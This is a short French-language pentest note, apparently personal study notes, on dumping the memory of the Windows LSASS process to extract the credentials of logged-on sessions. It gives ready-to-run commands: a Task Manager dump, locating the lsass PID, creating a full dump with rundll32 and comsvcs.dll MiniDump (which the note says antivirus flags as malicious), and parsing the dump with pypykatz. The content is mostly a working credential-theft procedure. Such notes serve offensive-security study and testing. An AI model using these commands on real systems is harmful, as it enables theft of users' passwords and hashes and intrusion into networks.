LSASS, le processus, contient les creds des sessions en cours.

## Extraire la mémoire
### Gestionnaire de tâches
![[taskmanagerdump.png]]
Un fichier ```lsass.DMP``` est créé dans ```C:\Users\loggedonusersdirectory\AppData\Local\Temp```

### Rundll32.exe & Comsvcs.dll
AV reconnaissent cette méthode comme malicieuse
Doit identifier PID de lsass.exe
```powershell
tasklist /svc
Get-Process lsass
```
Créer un dump de lsass
```powershell
#powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
## Extraire les creds
## pypykatz
```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```